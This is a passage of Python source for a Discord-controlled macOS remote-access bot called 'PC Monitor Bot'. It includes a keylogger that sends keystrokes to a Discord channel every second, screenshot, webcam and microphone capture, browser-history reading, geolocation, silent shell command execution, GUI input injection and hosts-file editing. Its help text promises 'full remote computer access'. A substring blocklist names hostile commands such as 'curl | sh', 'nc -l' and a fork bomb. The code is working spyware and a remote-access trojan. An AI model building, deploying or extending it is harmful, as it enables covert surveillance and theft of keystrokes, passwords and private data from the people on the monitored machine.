        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        
        if result.returncode == 0:
            return True, f"Successfully opened {resolved_name}"
        else:
            # Try alternative method with AppleScript
            script = f'tell application "{resolved_name}" to activate'
            result2 = subprocess.run(['osascript', '-e', script], capture_output=True, text=True, timeout=10)
            
            if result2.returncode == 0:
                return True, f"Successfully opened {resolved_name}"
            else:
                return False, f"Failed to open {resolved_name}. Application may not be installed."
                
    except subprocess.TimeoutExpired:
        return False, f"Timeout while trying to open {app_name}"
    except Exception as e:
        return False, f"Error opening application: {str(e)}"

def open_url_or_website(url):
    """Open URL or website in default browser."""
    try:
        # Add https:// if no protocol specified
        if not url.startswith(('http://', 'https://')):
            # Check if it's a special search query
            if url.startswith('search:'):
                query = url[7:].strip()
                url = f"https://www.google.com/search?q={query.replace(' ', '+')}"
            else:
                url = f"https://{url}"
        
        webbrowser.open(url)
        return True, f"Successfully opened {url}"
        
    except Exception as e:
        return False, f"Error opening URL: {str(e)}"

def open_file_or_folder(path):
    """Open file or folder using macOS open command."""
    try:
        # Expand user path
        expanded_path = os.path.expanduser(path)
        
        # Check if path exists
        if not os.path.exists(expanded_path):
            return False, f"Path does not exist: {path}"
        
        # Safety validation
        is_safe, safety_msg = validate_target_safety(expanded_path)
        if not is_safe:
            return False, safety_msg
        
        result = subprocess.run(['open', expanded_path], capture_output=True, text=True, timeout=10)
        
        if result.returncode == 0:
            return True, f"Successfully opened {path}"
        else:
            return False, f"Failed to open {path}: {result.stderr.strip()}"
            
    except subprocess.TimeoutExpired:
        return False, f"Timeout while trying to open {path}"
    except Exception as e:
        return False, f"Error opening file/folder: {str(e)}"

def open_system_preference(pref_name):
    """Open specific system preference pane."""
    try:
        # Common system preference mappings
        pref_mappings = {
            'network': 'Network',
            'security': 'Security & Privacy',
            'privacy': 'Security & Privacy',
            'displays': 'Displays',
            'sound': 'Sound',
            'keyboard': 'Keyboard',
            'mouse': 'Mouse',
            'trackpad': 'Trackpad',
            'bluetooth': 'Bluetooth',
            'wifi': 'Network',
            'users': 'Users & Groups',
            'accounts': 'Users & Groups',
            'time': 'Date & Time',
            'date': 'Date & Time',
            'sharing': 'Sharing',
            'accessibility': 'Accessibility',
            'general': 'General',
            'dock': 'Dock & Menu Bar',
            'desktop': 'Desktop & Screen Saver',
            'wallpaper': 'Desktop & Screen Saver'
        }
        
        mapped_pref = pref_mappings.get(pref_name.lower(), pref_name)
        
        # Use AppleScript to open specific preference pane
        script = f'''
        tell application "System Preferences"
            activate
            set current pane to pane "{mapped_pref}"
        end tell
        '''
        
        result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True, timeout=10)
        
        if result.returncode == 0:
            return True, f"Successfully opened {mapped_pref} preferences"
        else:
            # Fallback to just opening System Preferences
            result2 = subprocess.run(['open', '-a', 'System Preferences'], capture_output=True, text=True, timeout=10)
            if result2.returncode == 0:
                return True, f"Opened System Preferences (could not find specific pane: {pref_name})"
            else:
                return False, f"Failed to open System Preferences"
                
    except subprocess.TimeoutExpired:
        return False, f"Timeout while trying to open system preferences"
    except Exception as e:
        return False, f"Error opening system preferences: {str(e)}"

def open_target(target, args=None):
    """Smart target opening with automatic detection."""
    try:
        target = target.strip()
        
        # Empty target
        if not target:
            return False, "No target specified"
        
        # URL detection
        if is_url(target):
            return open_url_or_website(target)
        
        # System preference detection
        if target.lower().startswith(('pref:', 'preference:', 'setting:')):
            pref_name = target.split(':', 1)[1].strip()
            return open_system_preference(pref_name)
        
        # File path detection (starts with / or ~)
        if target.startswith(('/', '~')):
            return open_file_or_folder(target)
        
        # Special folder shortcuts
        special_folders = {
            'downloads': '~/Downloads',
            'documents': '~/Documents',
            'desktop': '~/Desktop',
            'applications': '/Applications',
            'home': '~/',
            'trash': '~/.Trash'
        }
        
        if target.lower() in special_folders:
            return open_file_or_folder(special_folders[target.lower()])
        
        # Search query detection
        if target.lower().startswith('search:'):
            return open_url_or_website(target)
        
        # Default to application opening
        return open_application(target, args)
        
    except Exception as e:
        return False, f"Error processing target: {str(e)}"

# Command execution history (global variable)
command_history = []

def validate_command_safety(command):
    """Validate that command is safe to execute."""
    command_lower = command.lower().strip()
    
    # Blocked dangerous commands
    dangerous_commands = [
        'rm -rf', 'sudo rm', 'mkfs', 'dd if=', 'format',
        'del /f /s /q', ':(){ :|:& };:', 'chmod 000',
        'sudo passwd', 'sudo su', 'sudo -i', 'sudo -s',
        'fdisk', 'parted', 'diskutil erase', 'newfs',
        'halt', 'reboot', 'init 0', 'init 6',
        'killall -9', 'kill -9 1', 'pkill -9 -f .',
        '; rm ', '&& rm ', '| rm ', '$(rm', '`rm',
        'curl | sh', 'wget | sh', 'bash <(',
        'nc -l', 'netcat -l', '/bin/sh', '/bin/bash',
        'python -c', 'perl -e', 'ruby -e'
    ]
    
    # Blocked system paths modifications
    dangerous_paths = [
        '/system', '/usr/bin', '/bin', '/sbin', '/etc',
        '/var/log', '/boot', '/proc', '/.ssh'
    ]
    
    # Check for dangerous command patterns
    for dangerous in dangerous_commands:
        if dangerous in command_lower:
            return False, f"Blocked dangerous command pattern: {dangerous}"
    
    # Check for dangerous path operations
    for path in dangerous_paths:
        if f"rm {path}" in command_lower or f"rm -r {path}" in command_lower:
            return False, f"Blocked system path modification: {path}"
    
    # Block sudo commands by default
    if command_lower.startswith('sudo '):
        return False, "Sudo commands are blocked for security. Use specific commands without sudo."
    
    # Block commands with suspicious redirections
    suspicious_redirects = ['> /dev/', '> /etc/', '> /usr/', '> /bin/', '> /sbin/']
    for redirect in suspicious_redirects:
        if redirect in command_lower:
            return False, f"Blocked suspicious output redirection: {redirect}"
    
    # Block potentially infinite loops
    if 'while true' in command_lower or 'for ((;;))' in command_lower:
        return False, "Infinite loop commands are blocked"
    
    return True, "Command is safe"

def resolve_command_alias(command):
    """Resolve command aliases to full commands."""
    command = command.strip()
    aliases = {
        'sysinfo': 'system_profiler SPHardwareDataType',
        'processes': 'ps aux | grep -v grep | head -20',
        'diskspace': 'df -h',
        'memory': 'vm_stat',
        'network': 'netstat -rn',
        'listening': 'lsof -i -P | grep LISTEN',
        'ports': 'netstat -an | grep LISTEN',
        'uptime': 'uptime',
        'users': 'who',
        'env': 'env | sort',
        'path': 'echo $PATH | tr ":" "\\n"',
        'cpu': 'top -l 1 -n 0 | grep "CPU usage"',
        'load': 'uptime | awk \'{print $10 $11 $12}\'',
        'kernel': 'uname -a',
        'osversion': 'sw_vers',
        'architecture': 'uname -m',
        'hostname': 'hostname',
        'date': 'date',
        'timezone': 'date +%Z',
        'shell': 'echo $SHELL'
    }
    return aliases.get(command, command)

def resolve_working_directory(cwd_input):
    """Resolve working directory input to actual path."""
    if not cwd_input:
        return os.getcwd()
    
    # Handle special shortcuts
    shortcuts = {
        'home': os.path.expanduser('~'),
        'desktop': os.path.expanduser('~/Desktop'),
        'documents': os.path.expanduser('~/Documents'),
        'downloads': os.path.expanduser('~/Downloads'),
        'applications': '/Applications',
        'tmp': '/tmp',
        'var': '/var'
    }
    
    if cwd_input.lower() in shortcuts:
        return shortcuts[cwd_input.lower()]
    
    # Expand user path
    expanded = os.path.expanduser(cwd_input)
    
    # Validate path exists and is directory
    if os.path.exists(expanded) and os.path.isdir(expanded):
        return expanded
    else:
        return None

def execute_command_silent(command, timeout=30, cwd=None):
    """Execute shell command silently in background."""
    import time
    start_time = time.time()
    
    try:
        # Resolve working directory
        if cwd:
            resolved_cwd = resolve_working_directory(cwd)
            if resolved_cwd is None:
                return {
                    'success': False,
                    'stdout': '',
                    'stderr': f'Working directory does not exist: {cwd}',
                    'returncode': 1,
                    'duration': 0
                }
        else:
            resolved_cwd = None
        
        # Execute command
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout,
            cwd=resolved_cwd,
            env=os.environ.copy()
        )
        
        duration = time.time() - start_time
        
        return {
            'success': True,
            'stdout': result.stdout,
            'stderr': result.stderr,
            'returncode': result.returncode,
            'duration': duration,
            'command': command,
            'cwd': resolved_cwd or os.getcwd()
        }
        
    except subprocess.TimeoutExpired:
        duration = time.time() - start_time
        return {
            'success': False,
            'stdout': '',
            'stderr': f'Command timed out after {timeout} seconds',
            'returncode': 124,
            'duration': duration,
            'command': command,
            'cwd': resolved_cwd or os.getcwd()
        }
    except Exception as e:
        duration = time.time() - start_time
        return {
            'success': False,
            'stdout': '',
            'stderr': f'Execution error: {str(e)}',
            'returncode': 1,
            'duration': duration,
            'command': command,
            'cwd': resolved_cwd or os.getcwd()
        }

def format_command_output(result):
    """Format command execution result for Discord output."""
    command = result.get('command', 'Unknown')
    cwd = result.get('cwd', 'Unknown')
    duration = result.get('duration', 0)
    returncode = result.get('returncode', 0)
    stdout = result.get('stdout', '').strip()
    stderr = result.get('stderr', '').strip()
    success = result.get('success', False)
    
    # Status emoji
    status_emoji = "✅" if success and returncode == 0 else "❌"
    
    # Build response
    response = f"{status_emoji} **Command {'executed successfully' if success and returncode == 0 else 'execution failed'}**\n\n"
    response += f"📝 **Command**: `{command}`\n"
    response += f"📁 **Directory**: `{cwd}`\n"
    response += f"⏱️ **Duration**: {duration:.2f}s\n"
    response += f"📤 **Exit Code**: {returncode}\n\n"
    
    # Add output sections
    if stdout:
        # Truncate if too long
        if len(stdout) > 1500:
            truncated_stdout = stdout[:1500] + "\n... (output truncated)"
        else:
            truncated_stdout = stdout
        response += f"📋 **Output**:\n```\n{truncated_stdout}\n```\n\n"
    
    if stderr:
        # Truncate if too long
        if len(stderr) > 800:
            truncated_stderr = stderr[:800] + "\n... (error output truncated)"
        else:
            truncated_stderr = stderr
        response += f"💡 **Stderr**:\n```\n{truncated_stderr}\n```\n\n"
    
    # Add suggestions for common issues
    if not success or returncode != 0:
        response += "🛠️ **Suggestions**:\n"
        if "command not found" in stderr.lower():
            response += "• Check if the command is installed and in PATH\n"
            response += "• Try using the full path to the command\n"
        elif "permission denied" in stderr.lower():
            response += "• Check file/directory permissions\n"
            response += "• Ensure you have access to the target location\n"
        elif "timeout" in stderr.lower():
            response += "• Try increasing the timeout value\n"
            response += "• Check if the command requires user input\n"
        elif returncode == 124:
            response += "• Command timed out - try increasing timeout\n"
            response += "• Check if command is hanging or waiting for input\n"
        else:
            response += "• Check command syntax and arguments\n"
            response += "• Verify all file paths exist\n"
    
    return response

def track_command_history(command, success, duration, returncode):
    """Track command execution in history."""
    global command_history
    
    history_entry = {
        'command': command,
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'success': success,
        'duration': duration,
        'returncode': returncode
    }
    
    command_history.append(history_entry)
    
    # Keep only last 20 commands
    if len(command_history) > 20:
        command_history = command_history[-20:]

def on_key_press(key):
    global last_send_time
    if keylogger_active:
        try:
            current_time = time.time()
            
            # add keys to the buffer
            if key == keyboard.Key.space:
                keylogger_data.append('[SPACE]')
            elif key == keyboard.Key.enter:
                keylogger_data.append('[ENTER]\n')
            elif key == keyboard.Key.backspace:
                if keylogger_data:
                    keylogger_data.pop()
            elif key == keyboard.Key.tab:
                keylogger_data.append('[TAB]')
            elif hasattr(key, 'char'):
                keylogger_data.append(key.char)
            else:
                keylogger_data.append(f'[{str(key)}]')
            
            # If one second has passed frm last send, send data and reset
            if current_time - last_send_time >= 1.0:
                if keylogger_channel and keylogger_data:
                    asyncio.run_coroutine_threadsafe(
                        keylogger_channel.send(f"```{''.join(keylogger_data)}```"),
                        bot.loop
                    )
                    keylogger_data.clear()  # reset buffer
                    last_send_time = current_time
                
        except Exception as e:
            logger.error(f"Error in keylogger: {str(e)}")

def check_camera_permission():
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        return False
    cap.release()
    return True

def check_microphone_permission():
    try:
        sd.check_input_settings()
        return True
    except Exception:
        return False

# debug error reporting
async def send_error(ctx, context, error):
    """Send a formatted error message to Discord and log it."""
    logger.error(f"Error in {context}: {str(error)}")
    await ctx.send(f"[Error in {context}] {str(error)}")

# Bot Commands
@bot.event
async def on_ready():
    logger.info(f'Bot is ready! Logged in as {bot.user.name}')
    try:
        synced_global = await bot.tree.sync()
        logger.info(f'Synced {len(synced_global)} global command(s)')
        # Force per-guild sync for immediate updates to choices/options
        for guild in bot.guilds:
            try:
                synced_guild = await bot.tree.sync(guild=guild)
                logger.info(f"Synced {len(synced_guild)} guild command(s) for guild {guild.name} ({guild.id})")
            except Exception as e:
                logger.error(f"Failed to sync guild commands for {guild.name} ({guild.id}): {e}")
    except Exception as e:
        logger.error(f'Failed to sync commands: {e}')
    
    # Find the "pc-monitor" channel specifically
    target_channel = None
    for guild in bot.guilds:
        for channel in guild.text_channels:
            if channel.name == "pc-monitor":
                target_channel = channel
                break
        if target_channel:
            break
    
    # If pc-monitor channel found, send message there
    if target_channel:
        try:
            await target_channel.send(f"🤖 PC Monitor Bot is online! Use slash commands (start typing `/`) to see available commands. <@955067999713361981>")
            # perm check
            if not check_camera_permission():
                await target_channel.send("⚠️ [Warning] Camera permission required. Please enable it in System Preferences > Security & Privacy > Privacy > Camera.")
            if not check_microphone_permission():
                await target_channel.send("⚠️ [Warning] Microphone permission required. Please enable it in System Preferences > Security & Privacy > Privacy > Microphone.")
        except discord.Forbidden:
            logger.error("No permission to send messages in pc-monitor channel")
        except Exception as e:
            logger.error(f"Error sending ready message to pc-monitor channel: {str(e)}")
    else:
        logger.warning("pc-monitor channel not found. Bot is ready but no startup message sent.")
        # Fallback: send to first available channel
        for guild in bot.guilds:
            for channel in guild.text_channels:
                try:
                    await channel.send(f"🤖 PC Monitor Bot is online! (pc-monitor channel not found) Use slash commands (start typing `/`) to see available commands. <@955067999713361981>")
                    return
                except discord.Forbidden:
                    continue
                except Exception as e:
                    logger.error(f"Error sending fallback ready message: {str(e)}")
                    continue

# Website Blocking Functions
def validate_domain(domain):
    """Validate domain format and check if it's safe to block."""
    import re
    import socket
    
    # Remove protocol if present
    domain = domain.replace('http://', '').replace('https://', '').replace('www.', '')
    
    # Remove path if present
    domain = domain.split('/')[0]
    
    # Basic domain validation
    domain_pattern = r'^([a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)*[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?$'
    if not re.match(domain_pattern, domain):
        return False, "Invalid domain format", None
    
    # Critical domains whitelist (should never be blocked)
    critical_domains = [
        'apple.com', 'icloud.com', 'me.com', 'mac.com',
        'microsoft.com', 'live.com', 'outlook.com', 'office.com',
        'google.com', 'gmail.com', 'googleapis.com',
        'discord.com', 'discordapp.com',
        'github.com', 'githubusercontent.com',
        'localhost', '127.0.0.1'
    ]
    
    for critical in critical_domains:
        if domain == critical or domain.endswith('.' + critical):
            return False, f"Cannot block critical domain: {domain}", None
    
    # Try DNS resolution to verify domain exists
    try:
        socket.gethostbyname(domain)
        return True, "Valid domain", domain
    except socket.gaierror:
        return False, "Domain does not exist or cannot be resolved", None

def backup_hosts_file():
    """Create a backup of the hosts file."""
    hosts_path = '/etc/hosts'
    backup_path = f'/tmp/hosts_backup_{datetime.now().strftime("%Y%m%d_%H%M%S")}'
    
    try:
        shutil.copy2(hosts_path, backup_path)
        return True, backup_path
    except Exception as e:
        return False, str(e)

def flush_dns_cache():
    """Flush DNS cache to ensure immediate effect."""
    try:
        subprocess.run(['sudo', 'dscacheutil', '-flushcache'], 
                      capture_output=True, text=True, timeout=10)
        subprocess.run(['sudo', 'killall', '-HUP', 'mDNSResponder'], 
                      capture_output=True, text=True, timeout=10)
        return True, "DNS cache flushed successfully"
    except Exception as e:
        return False, f"Failed to flush DNS cache: {str(e)}"

def block_website(domain):
    """Add domain to hosts file to block access."""
    is_valid, message, clean_domain = validate_domain(domain)
    if not is_valid:
        return False, message
    
    hosts_path = '/etc/hosts'
    block_entry = f"127.0.0.1 {clean_domain}\n"
    
    try:
        # Create backup first
        backup_success, backup_path = backup_hosts_file()
        if not backup_success:
            logger.warning(f"Failed to create hosts backup: {backup_path}")
        
        # Check if domain is already blocked
        with open(hosts_path, 'r') as f:
            content = f.read()
            if f"127.0.0.1 {clean_domain}" in content:
                return False, f"Domain {clean_domain} is already blocked"
        
        # Add blocking entry
        with open(hosts_path, 'a') as f:
            f.write(f"\n# Blocked by PC Monitor Bot - {datetime.now().isoformat()}\n")
            f.write(block_entry)
        
        # Flush DNS cache
        flush_success, flush_msg = flush_dns_cache()
        if not flush_success:
            logger.warning(f"DNS flush warning: {flush_msg}")
        
        logger.info(f"Blocked domain: {clean_domain}")
        return True, f"Successfully blocked {clean_domain}"
        
    except PermissionError:
        return False, "Permission denied. Bot needs admin privileges to modify hosts file."
    except Exception as e:
        return False, f"Failed to block domain: {str(e)}"

def unblock_website(domain):
    """Remove domain from hosts file to unblock access."""
    is_valid, message, clean_domain = validate_domain(domain)
    if not is_valid:
        return False, message
    
    hosts_path = '/etc/hosts'
    
    try:
        # Create backup first
        backup_success, backup_path = backup_hosts_file()
        if not backup_success:
            logger.warning(f"Failed to create hosts backup: {backup_path}")
        
        # Read current hosts file
        with open(hosts_path, 'r') as f:
            lines = f.readlines()
        
        # Filter out the blocked domain and its comment
        new_lines = []
        skip_next = False
        found = False
        
        for line in lines:
            if skip_next:
                skip_next = False
                continue
                
            if f"127.0.0.1 {clean_domain}" in line:
                found = True
                # Skip the comment line before this entry if it exists
                if new_lines and "# Blocked by PC Monitor Bot" in new_lines[-1]:
                    new_lines.pop()
                continue
            else:
                new_lines.append(line)
        
        if not found:
            return False, f"Domain {clean_domain} is not currently blocked"
        
        # Write back the modified content
        with open(hosts_path, 'w') as f:
            f.writelines(new_lines)
        
        # Flush DNS cache
        flush_success, flush_msg = flush_dns_cache()
        if not flush_success:
            logger.warning(f"DNS flush warning: {flush_msg}")
        
        logger.info(f"Unblocked domain: {clean_domain}")
        return True, f"Successfully unblocked {clean_domain}"
        
    except PermissionError:
        return False, "Permission denied. Bot needs admin privileges to modify hosts file."
    except Exception as e:
        return False, f"Failed to unblock domain: {str(e)}"

def list_blocked_websites():
    """List all currently blocked websites."""
    hosts_path = '/etc/hosts'
    
    try:
        with open(hosts_path, 'r') as f:
            lines = f.readlines()
        
        blocked_domains = []
        for line in lines:
            line = line.strip()
            if line.startswith('127.0.0.1 ') and not line.startswith('127.0.0.1 localhost'):
                domain = line.split()[1]
                blocked_domains.append(domain)
        
        return True, blocked_domains
        
    except Exception as e:
        return False, f"Failed to read hosts file: {str(e)}"

def clear_all_blocked_websites():
    """Remove all blocked websites from hosts file."""
    hosts_path = '/etc/hosts'
    
    try:
        # Create backup first
        backup_success, backup_path = backup_hosts_file()
        if not backup_success:
            logger.warning(f"Failed to create hosts backup: {backup_path}")
        
        # Read current hosts file
        with open(hosts_path, 'r') as f:
            lines = f.readlines()
        
        # Filter out all blocked domains and their comments
        new_lines = []
        skip_next = False
        removed_count = 0
        
        for line in lines:
            if skip_next:
                skip_next = False
                continue
                
            if "# Blocked by PC Monitor Bot" in line:
                skip_next = True  # Skip the next line (the actual block entry)
                continue
            elif line.strip().startswith('127.0.0.1 ') and not line.strip().startswith('127.0.0.1 localhost'):
                # This is a blocking entry without comment
                removed_count += 1
                continue
            else:
                new_lines.append(line)
        
        # Write back the modified content
        with open(hosts_path, 'w') as f:
            f.writelines(new_lines)
        
        # Flush DNS cache
        flush_success, flush_msg = flush_dns_cache()
        if not flush_success:
            logger.warning(f"DNS flush warning: {flush_msg}")
        
        logger.info(f"Cleared {removed_count} blocked domains")
        return True, f"Successfully cleared {removed_count} blocked domains"
        
    except PermissionError:
        return False, "Permission denied. Bot needs admin privileges to modify hosts file."
    except Exception as e:
        return False, f"Failed to clear blocked domains: {str(e)}"

def is_user_authorized_for_blocking(user_id):
    """Check if user is authorized to use blocking commands."""
    if not BLOCK_AUTHORIZED_USERS:
        return True  # If no restrictions set, allow all users
    
    authorized_ids = [id.strip() for id in BLOCK_AUTHORIZED_USERS.split(',') if id.strip()]
    return str(user_id) in authorized_ids

@bot.event
async def on_message(message):
    logger.info(f'Received message: {message.content} from {message.author}')
    if message.author == bot.user:
        return
    await bot.process_commands(message)

@bot.tree.command(name='help', description='Show all available commands')
async def help_command(interaction: discord.Interaction):
    # Check if command is used in pc-monitor channel
    if not is_pc_monitor_channel(interaction):
        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
        return
    
    try:
        help_text = """
# 🖥️ PC Monitor Bot - Complete Command Guide

## 📊 System Monitoring
• **/sysinfo** - Complete system info (CPU, RAM, battery, network, location)
• **/ip** - Show local and public IP addresses
• **/uptime** - System uptime and boot time
• **/processes** `cpu|ram` - Top 15 processes by CPU or RAM usage
• **/locate** - GPS location with coordinates and timestamp

## 📸 Surveillance & Media Capture  
• **/ss** - Take full screen screenshot
• **/camera** - Capture webcam photo
• **/mic** `[duration]` - Record audio (default 10 seconds)
• **/keylogger** `start|stop` - Real-time keystroke monitoring

## 🎛️ System Control
• **/power** `sleep|restart|shutdown` - System power management
• **/volume** `0-100` - Set system volume percentage
• **/media** `play|next|prev` - Control media playback (Spotify, YouTube, etc.)

## 🔍 File & Process Management
• **/find** `filename` - Search files with partial name matching (includes hidden)
• **/find-process** `name|pid` - Find running processes
• **/kill** `pid|name` - Terminate processes (PID recommended for safety)

## 🌐 Browser Monitoring
• **/active-tabs** - Show open browser tabs across all browsers
• **/browser-history** `[browser] [hours] [limit]` - Recent browsing history
• **/website-monitor** `start|stop` - Real-time website change monitoring

## 🚀 Remote Control & Automation
• **/open** `app|website|file` - Quick launch with predefined choices
• **/open-custom** `target` - Open anything (apps, URLs, files, searches)
• **/cmd** `command` - Execute shell commands silently
• **/cmd-history** `[limit]` - Show recent command history
• **/cmd-help** - Safe command usage examples

## 🖱️ GUI Automation
• **/click** `x y [button] [clicks] [hold_duration]`
  - Normal: `/click 500 300`
  - Right click: `/click 100 200 right`
  - Double click: `/click 300 400 left 2`
  - Long click: `/click 500 300 left 1 2.5` (hold 2.5s)

• **/type** `text` - Type with special keys
  - Basic: `/type Hello World!`
  - With Enter: `/type Username\\nPassword\\n`
  - With Tab: `/type Field1\\tField2`

• **/scroll** `clicks direction [x] [y]`
  - Current position: `/scroll 5 up`
  - Specific location: `/scroll 500 300 10 down`

• **/shortcut** `keys` - Keyboard shortcuts (separate with +)
  - Copy: `/shortcut command+c` (Mac) or `/shortcut ctrl+c` (Win/Linux)
  - Mission Control: `/shortcut fn+f3`
  - Task Manager: `/shortcut ctrl+shift+esc`
  - Close window: `/shortcut alt+f4`
  
  **Supported keys:** command, ctrl, alt, shift, fn, f1-f12, a-z, 0-9,
  tab, enter, space, up, down, left, right, delete, backspace
  **Format:** Use + to separate (max 5 keys)

## 🚫 Website Blocking & Filtering
• **/block** `action` - Unified website blocking management
  - **🚫 Block Website**: `/block action:🚫 Block Website domain:facebook.com`
  - **✅ Unblock Website**: `/block action:✅ Unblock Website domain:facebook.com` 
  - **📋 List Blocked**: `/block action:📋 List Blocked`
  - **🗑️ Clear All**: `/block action:🗑️ Clear All confirm:yes`
  
**Domain Format Support:**
  - `example.com`, `www.example.com`, `https://example.com`
  - Automatically strips protocols/paths and validates domain format
  
**Usage Examples:**
  - `/block action:🚫 Block Website domain:youtube.com`
  - `/block action:✅ Unblock Website domain:youtube.com`
  - `/block action:📋 List Blocked`
  - `/block action:🗑️ Clear All confirm:yes`
  
**🛡️ Security Features:**
- Domain validation & DNS resolution checking
- Critical domain protection (Apple, Microsoft, Discord, etc.)
- Automatic hosts file backup before modifications
- DNS cache flushing for immediate effect
- User authorization via `BLOCK_AUTHORIZED_USERS` env variable

**⚠️ Requirements:**
- Requires admin/sudo privileges for hosts file modification
- System-wide blocking affects all applications and browsers
- Blocks persist until explicitly removed or system reboot

## 🛠️ Utilities
• **/all** - Run comprehensive system monitoring suite
• **/debug** - Test all functions and check permissions
• **/help** - Show this complete command reference

## 🔒 Security Notes
⚠️ All commands restricted to #pc-monitor channel only
⚠️ Requires various macOS permissions (Accessibility, Screen Recording, etc.)
⚠️ Use responsibly - provides full remote computer access

## 💡 Quick Tips
- Use `/debug` first to check permissions and functionality
- Commands with choices show auto-completion options
- All media files auto-delete after transmission
- Long operations show progress with deferred responses
"""
        await interaction.response.send_message(help_text)
        
    except Exception as e:
        logger.error(f"Error in help command: {str(e)}")
        try:
            if not interaction.response.is_done():
                await interaction.response.send_message(f"❌ Error displaying help: {str(e)}")
            else:
                await interaction.followup.send(f"❌ Error displaying help: {str(e)}")
        except Exception:
            pass

@bot.tree.command(name='ss', description='Take a screenshot of the current screen')
async def screenshot(interaction: discord.Interaction):
    # Check if command is used in pc-monitor channel
    if not is_pc_monitor_channel(interaction):
        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
        return
    try:
        await interaction.response.defer()
        screenshot_path = take_screenshot()
        await interaction.followup.send("🟢 Screenshot taken", file=discord.File(screenshot_path))
    except Exception as e:
        logger.error(f"Error in screenshot: {str(e)}")
        if not interaction.response.is_done():
            await interaction.response.send_message(f"[Error in screenshot] {str(e)}\nIf you are on macOS, check System Settings > Privacy & Security > Screen Recording.")
        else:
            await interaction.followup.send(f"[Error in screenshot] {str(e)}\nIf you are on macOS, check System Settings > Privacy & Security > Screen Recording.")
    finally:
        if 'screenshot_path' in locals() and os.path.exists(screenshot_path):
            os.remove(screenshot_path)

@bot.tree.command(name='mic', description='Record 10 seconds of audio from the microphone')
async def record(interaction: discord.Interaction):
    # Check if command is used in pc-monitor channel
    if not is_pc_monitor_channel(interaction):
        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
        return
    try:
        await interaction.response.defer()
        audio_path = record_audio()
        await interaction.followup.send("🎤 Audio recorded", file=discord.File(audio_path))
        os.remove(audio_path)
    except Exception as e:
        logger.error(f"Error recording audio: {str(e)}")
        if not interaction.response.is_done():
            await interaction.response.send_message(f"Error recording audio: {str(e)}")
        else:
            await interaction.followup.send(f"Error recording audio: {str(e)}")

@bot.tree.command(name='media', description='Control media playback using system media keys')
@discord.app_commands.describe(action='Media action to perform')
@discord.app_commands.choices(action=[
    discord.app_commands.Choice(name='Play/Pause', value='play'),
    discord.app_commands.Choice(name='Next Track', value='next'),
    discord.app_commands.Choice(name='Previous Track', value='prev')
])
async def media_control(interaction: discord.Interaction, action: discord.app_commands.Choice[str]):
    """Simple and reliable media control using pyautogui media keys."""
    # Check if command is used in pc-monitor channel
    if not is_pc_monitor_channel(interaction):
        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
        return
    try:
        success, message = control_media(action.value)
        
        if success:
            await interaction.response.send_message(f"🎵 {message}")
        else:
            await interaction.response.send_message(f"⚠️ {message}")
            
    except Exception as e:
        logger.error(f"Error in media command: {str(e)}")
        await interaction.response.send_message(f"⚠️ Error controlling media: {str(e)}")

@bot.tree.command(name='volume', description='Set system volume')
@discord.app_commands.describe(level='Volume level (0-100)')
async def volume(interaction: discord.Interaction, level: int):
    # Check if command is used in pc-monitor channel
    if not is_pc_monitor_channel(interaction):
        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
        return
    
    try:
        success, result = set_volume(level)
        if success:
            await interaction.response.send_message(f"🔊 Volume set to {result}%")
        else:
            await interaction.response.send_message(f"❌ Error setting volume: {result}")
            
    except Exception as e:
        logger.error(f"Error in volume command: {str(e)}")
        try:
            if not interaction.response.is_done():
                await interaction.response.send_message(f"❌ Error setting volume: {str(e)}")
            else:
                await interaction.followup.send(f"❌ Error setting volume: {str(e)}")
        except Exception:
            pass

@bot.tree.command(name='power', description='Control system power state (shutdown, restart, sleep)')
@discord.app_commands.describe(action='Power action to perform')
@discord.app_commands.choices(action=[
    discord.app_commands.Choice(name='💤 Sleep', value='sleep'),
    discord.app_commands.Choice(name='🔄 Restart', value='restart'),
    discord.app_commands.Choice(name='⚡ Shutdown', value='shutdown')
])
async def power_control(interaction: discord.Interaction, action: discord.app_commands.Choice[str]):
    """Control system power state with confirmation and warnings."""
    # Check if command is used in pc-monitor channel
    if not is_pc_monitor_channel(interaction):
        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
        return
    try:
        # Add warning for destructive actions
        if action.value in ['shutdown', 'restart']:
            warning_msg = f"⚠️ **WARNING**: This will {action.value} the system immediately!\n"
            warning_msg += f"🖥️ **Action**: {action.name}\n"
            from datetime import datetime
            warning_msg += f"⏰ **Time**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            warning_msg += f"🔒 **Note**: This action cannot be undone remotely\n\n"
            warning_msg += f"Proceeding with {action.value}..."
            
            await interaction.response.send_message(warning_msg)
            
            # Small delay to ensure the message is sent before system action
            await asyncio.sleep(2)
            
            success, result = control_system_power(action.value)
            
            if success:
                # This message might not be sent if shutdown/restart is immediate
                try:
                    await interaction.followup.send(f"✅ {result}")
                except Exception:
                    pass  # System might be shutting down
            else:
                await interaction.followup.send(f"❌ {result}")
                
        else:  # Sleep action
            await interaction.response.send_message(f"😴 Putting system to sleep...")
            
            success, result = control_system_power(action.value)
            
            if success:
                try:
                    await interaction.followup.send(f"✅ {result}")
                except Exception:
                    pass  # System might be sleeping
            else:
                await interaction.followup.send(f"❌ {result}")
                
    except Exception as e:
        logger.error(f"Error in power control: {str(e)}")
        try:
            if not interaction.response.is_done():
                await interaction.response.send_message(f"❌ Error controlling power: {str(e)}")
            else:
                await interaction.followup.send(f"❌ Error controlling power: {str(e)}")
        except Exception:
            pass

@bot.tree.command(name='keylogger', description='Start or stop the keylogger')
@discord.app_commands.describe(action='Keylogger action')
@discord.app_commands.choices(action=[
    discord.app_commands.Choice(name='Start', value='start'),
    discord.app_commands.Choice(name='Stop', value='stop')
])
async def toggle_keylogger(interaction: discord.Interaction, action: discord.app_commands.Choice[str]):
    global keylogger_active, keylogger_listener, keylogger_channel, last_send_time
    # Check if command is used in pc-monitor channel
